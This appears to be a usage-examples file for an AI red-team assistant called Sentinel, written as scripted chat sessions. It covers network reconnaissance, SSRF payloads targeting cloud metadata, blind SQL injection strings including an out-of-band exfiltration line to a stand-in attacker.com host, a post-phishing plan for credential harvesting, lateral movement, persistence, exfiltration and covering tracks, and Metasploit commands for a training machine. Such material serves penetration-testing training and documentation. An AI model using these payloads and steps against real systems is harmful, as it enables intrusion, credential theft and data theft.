# Sentinel Red Team - Usage Examples

## Example 1: Basic Reconnaissance

```bash
$ python sentinel.py

You: I need to perform reconnaissance on 192.168.1.0/24. It's my home lab network.

Sentinel: I'll help you with reconnaissance on your lab network. Here's a systematic approach:

**Phase 1: Host Discovery**
First, let's identify live hosts:
```bash
nmap -sn 192.168.1.0/24
```

**Phase 2: Port Scanning**
For discovered hosts, scan common ports:
```bash
nmap -sV -sC -T4 --top-ports=1000 <target_ip>
```

**Phase 3: Service Enumeration**
Based on open ports, enumerate services:
- HTTP/HTTPS: Check for web servers, directories
- SSH: Check authentication methods
- SMB: Enumerate shares (if Windows)

Would you like me to walk you through any specific service enumeration?
```

## Example 2: Teaching Sentinel a Technique

```bash
You: teach

Technique name: SSRF via Image Upload
Category: exploitation
Description: Exploit SSRF vulnerability in image upload functionality to access internal services

Enter steps (one per line, empty line to finish):
  Step 1: Identify image upload functionality
  Step 2: Test if server fetches images from URL
  Step 3: Attempt to access internal IP ranges (127.0.0.1, 169.254.169.254, 10.0.0.0/8)
  Step 4: Try to access cloud metadata (AWS, Azure, GCP)
  Step 5: Extract sensitive data from responses
  Step 6: 

Enter commands/examples (one per line, empty line to finish):
  Command 1: http://127.0.0.1:6379/
  Command 2: http://169.254.169.254/latest/meta-data/
  Command 3: http://metadata.google.internal/computeMetadata/v1/
  Command 4: 

✓ Technique learned! ID: a3f9d82bc1e4
Sentinel can now use this technique in future engagements.
```

## Example 3: Web Application Testing

```bash
You: I'm testing a web application at https://testapp.local. Walk me through your methodology.

Sentinel: Let's approach this systematically. Here's my web application testing methodology:

**1. Information Gathering**
- Technology identification (Wappalyzer, whatweb)
- Directory enumeration
- JavaScript analysis
- API endpoint discovery

**2. Authentication & Session Management**
- Test password policies
- Brute force protection
- Session fixation
- JWT vulnerabilities

**3. Input Validation**
- SQL Injection (error-based, blind, time-based)
- XSS (reflected, stored, DOM-based)
- Command injection
- XXE
- SSRF

**4. Business Logic**
- Authorization bypass
- Race conditions
- Mass assignment
- Price manipulation

**5. File Operations**
- File upload bypasses
- Path traversal
- Unrestricted file upload

Let's start with #1. What technology stack is the application using?
```

## Example 4: Query Specific Technique

```bash
You: How do I perform a blind SQL injection when I can't see error messages?

Sentinel: For blind SQL injection, you need to infer information based on the application's behavior. Here are the main techniques:

**1. Boolean-Based Blind SQLi**
Test if you can cause True/False conditions:
```sql
' AND 1=1-- (True - normal response)
' AND 1=2-- (False - different response)
```

**2. Time-Based Blind SQLi**
Use time delays to confirm injection:
```sql
' AND SLEEP(5)--               (MySQL)
'; WAITFOR DELAY '0:0:5'--     (MSSQL)
' AND pg_sleep(5)--            (PostgreSQL)
```

**3. Out-of-Band (OOB) Exfiltration**
Exfiltrate data via DNS or HTTP:
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\'))--
```

**Example Attack Chain:**
1. Confirm injection: `' AND SLEEP(5)--`
2. Extract database name: `' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(5),0)--`
3. Binary search for efficiency
4. Automate with sqlmap: `sqlmap -u "url?id=1" --batch --technique=T`

Would you like me to explain any of these techniques in more detail?
```

## Example 5: Learning from Corrections

```bash
You: Scan this target: example.com

Sentinel: Before proceeding, I need to verify authorization. Is example.com in your authorized scope?

You: Yes, it's in my engagement scope.

Sentinel: Thank you. I'll perform reconnaissance on example.com:

1. Subdomain enumeration:
   ```bash
   amass enum -d example.com
   ```

You: No, don't use amass. Use subfinder instead - it's faster for this use case.

Sentinel: [LEARNING] Updating tool preferences...
✓ Noted: subfinder preferred over amass for speed

Understood. I'll use subfinder:
```bash
subfinder -d example.com -o subdomains.txt
```

[In future engagements, Sentinel will remember this preference]
```

## Example 6: Advanced Engagement

```bash
You: I'm doing a red team engagement against a corporate network. I have initial access via phishing. What's next?

Sentinel: ⚠️ This requires careful planning and authorization verification.

**Post-Exploitation Methodology:**

**Phase 1: Situational Awareness**
```powershell
# System info
systeminfo
whoami /all
net user %username%

# Network info
ipconfig /all
route print
netstat -ano
```

**Phase 2: Privilege Escalation**
- Check for misconfigurations
- Vulnerable services
- Kernel exploits
- Token impersonation

**Phase 3: Credential Harvesting**
- Browser passwords
- Saved credentials
- Memory dumps (Mimikatz)
- LSA secrets

**Phase 4: Lateral Movement**
- SMB shares
- WMI/PSExec
- Pass-the-hash
- Golden ticket

**Phase 5: Persistence**
- Registry autoruns
- Scheduled tasks
- Service installation
- WMI event subscriptions

**Phase 6: Data Exfiltration**
- Identify sensitive data
- Compress and encrypt
- Exfiltrate via DNS/HTTPS
- Cover tracks

Would you like me to detail any specific phase?
```

## Example 7: Generating Reports

```bash
You: Generate a report from today's testing

Sentinel: I'll compile your testing activities into a professional report.

[Analyzing conversation history and techniques used...]

**Report Generated:**
- Executive Summary
- Methodology
- Findings (3 Critical, 5 High, 8 Medium)
- Technical Details
- Exploitation Steps
- Remediation Recommendations

Report saved to: reports/engagement_2026-02-09.md

Would you like me to export this to PDF as well?
```

## Example 8: CTF/Training Mode

```bash
You: I'm working on HackTheBox machine "Legacy". Help me get started.

Sentinel: HackTheBox Legacy is a great beginner machine. Let's approach it systematically:

**Step 1: Reconnaissance**
```bash
nmap -sC -sV -oA legacy 10.10.10.4
```

Key ports to look for:
- 139/445 (SMB) - likely vulnerable
- 3389 (RDP)

**Step 2: Vulnerability Identification**
This is a Windows XP machine, so check for:
- MS08-067 (NetAPI)
- MS17-010 (EternalBlue)

**Step 3: Exploitation**
Use Metasploit:
```bash
msfconsole
use exploit/windows/smb/ms08_067_netapi
set RHOSTS 10.10.10.4
set LHOST tun0
exploit
```

Try this and let me know what happens!
```

---

## Tips for Using Sentinel

1. **Be Specific**: The more context you provide, the better Sentinel can help
2. **Teach It**: Use the `teach` command to add your custom techniques
3. **Verify Scope**: Always confirm targets are authorized
4. **Iterate**: Sentinel learns from corrections - don't hesitate to correct it
5. **Save Sessions**: Use `save` to preserve important conversations
6. **Check Stats**: Use `stats` to see your growing knowledge base

---

## Advanced Features (Coming Soon)

- Automated vulnerability scanning
- Exploit chain generation
- Real-time tool integration
- Multi-agent orchestration
- Collaborative red teaming
- Advanced reporting
